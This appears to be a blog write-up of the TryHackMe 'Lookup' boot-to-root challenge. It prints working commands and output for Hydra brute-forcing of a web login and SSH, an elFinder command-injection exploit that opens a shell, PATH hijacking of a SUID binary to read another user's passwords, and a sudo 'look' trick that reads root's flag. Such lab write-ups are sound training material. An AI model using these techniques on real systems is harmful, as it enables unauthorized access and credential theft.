---
title: "Lookup"
date: 2025-03-01
image: /assets/img/general/CTFgeneral_image.jpg
description: Writeup of the TryHackMe-CTF Lookup
categories: [TryHackMe, Easy]
tags: [linux, ci]
---

## Challenge Description
<center>
<table>
  <tr>
    <td>Platform</td>
    <td>TryHackMe</td>
  </tr>
  <tr>
    <td>Name</td>
    <td>Lookup</td>
  </tr>
  <tr>
    <td>Description</td>
    <td>Test your enumeration skills on this boot-to-root machine.</td>
  </tr>
  <tr>
    <td>Difficulty</td>
    <td>Easy</td>
  </tr>
  <tr>
    <td>OS</td>
    <td>Linux</td>
  </tr>
  <tr>
    <td>Link</td>
    <td><a href="https://tryhackme.com/room/lookup">https://tryhackme.com/room/lookup</a></td>
  </tr>
</table>
</center>

This writeup is a possible solution of the CTF-challenge Lookup.  

## Enumeration
I started the enumeration using `nmap`:
```bash
$ nmap -p- 10.10.180.229
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 07:28 EDT
  Nmap scan report for 10.10.180.229
  Host is up (0.040s latency).
  Not shown: 65533 closed tcp ports (conn-refused)
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

  Nmap done: 1 IP address (1 host up) scanned in 25.70 seconds
```
and enumerated the found services in more depth using nmap's `-A` flag:
```bash
$ nmap -A -p 22,80 10.10.180.229
  Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-01 07:29 EDT
  Nmap scan report for 10.10.180.229
  Host is up (0.053s latency).

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
  |   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
  |_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
  80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
  |_http-title: Did not follow redirect to http://lookup.thm
  |_http-server-header: Apache/2.4.41 (Ubuntu)
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  Nmap done: 1 IP address (1 host up) scanned in 8.16 seconds
```
From here I proceeded the analysis port by port.

## Port 80 Analysis

When accessing the website, I was redirected to `lookup.thm`, so I added it to my hosts file. After that, the website displayed a login page. I started with directory and subdomain enumeration but didn't find anything useful. 

![Login](/assets/img/tryhackme/Lookup/thm_lookup_1.jpg)

While analyzing the login process, I noticed that the error message changed when the username was correct:
```text
testusername  -> Wrong username or password. Please try again.<br>Redirecting in 3 seconds.
admin         -> Wrong password. Please try again.<br>Redirecting in 3 seconds.
```

Since I had a likely valid username, I initiated a brute force attack using Hydra:
```bash
$ hydra -l 'admin' -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password."
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-14 07:41:18
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong password.
[80][http-post-form] host: lookup.thm   login: admin   password: [removed]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-14 07:42:04
```

Hydra detected a change in the error message with this username-password combination, but I wasn't able to log in. This made me think that the password might be correct, but the username was wrong. With this assumption, I initiated another Hydra brute force attack, but this time I brute-forced the username: 
```bash
$ hydra -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p '[removed]' lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password."
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-14 07:46:54
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://lookup.thm:80/login.php:username=^USER^&password=^PASS^:Wrong username or password.
[80][http-post-form] host: lookup.thm   login: [removed]   password: [removed]
```

## Shell as www-data

Success! I was able to login, with the retrieved credentials and got redirected to another subdomain. After adding `files.lookup.thm` to my hosts file, I was able to access elFinder and checked the version number:

![Elfinder Version](/assets/img/tryhackme/Lookup/thm_lookup_2.jpg)

After researching the version number, I found the following 'PHP connector' Command Injection on <a href="https://www.exploit-db.com/exploits/46481">Exploit-DB</a>. The exploit required an image, so I downloaded a random image of a squirrel, named it `SecSignal.jpg`, and executed the exploit:
```bash
$ python2 exploit.py http://files.lookup.thm/elFinder/
[*] Uploading the malicious image...
[*] Running the payload...
[+] Pwned! :)
[+] Getting the shell...
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

I then moved over to Penelope for a more comfortable shell environment.

## Privilege Escalation think

While enumerating the system, I found a file called `.passwords`, but I didn't have permission to read it. 
```bash
www-data@lookup:/home/think$ cat .passwords 
cat: .passwords: Permission denied
```

I continued enumerating for files with the SUID bit set:
```bash
www-data@lookup:/home/think$ find / -perm /4000 -type f 2>/dev/null
/usr/sbin/pwm
```

Since it wasn't a regular binary, I executed it and analyzed its behavior:
```bash
www-data@lookup:/home/think$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found
```

It appeared that the script executed the `id` command and displayed the `.password` file for the user whose `id` returned. Since I found the `.password` under the `think` user, I created a new binary that would return the `id` output for the think user: 
```bash
www-data@lookup:/tmp$ touch id
www-data@lookup:/tmp$ echo '#!/bin/bash' > id
www-data@lookup:/tmp$ echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> id
www-data@lookup:/tmp$ chmod +x id
www-data@lookup:/tmp$ export PATH=/tmp:$PATH
www-data@lookup:/tmp$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
[...]
```

Success! I now had a list, which was likely a password list. I saved it to a file called `passwdlist` and used it to brute force SSH access for the think user:
```bash
$ hydra -l 'think' -P passwdlist ssh://10.10.180.229
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-03-14 08:11:32
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 49 login tries (l:1/p:49), ~4 tries per task
[DATA] attacking ssh://10.10.180.229:22/
[22][ssh] host: 10.10.180.229   login: think   password: [...]
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-03-14 08:11:50
```

The brute force was successful, and I was able to retrieve the user flag:
```bash
$ ssh think@10.10.180.229

think@lookup:~$ cat user.txt 
  3[removed]e
```

## Privilege Escalation root
I started with `sudo -l` and got the following output:
```bash
think@lookup:~$ sudo -l
  [sudo] password for think: 
  Matching Defaults entries for think on lookup:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

  User think may run the following commands on lookup:
      (ALL) /usr/bin/look
```
A quick search on <a href="https://gtfobins.github.io/gtfobins/look/">gftobins</a> gave me all I needed:
```bash
think@lookup:~$ LFILE=/root/root.txt
think@lookup:~$ sudo look '' "$LFILE"
  5[removed]8
```

solved! :)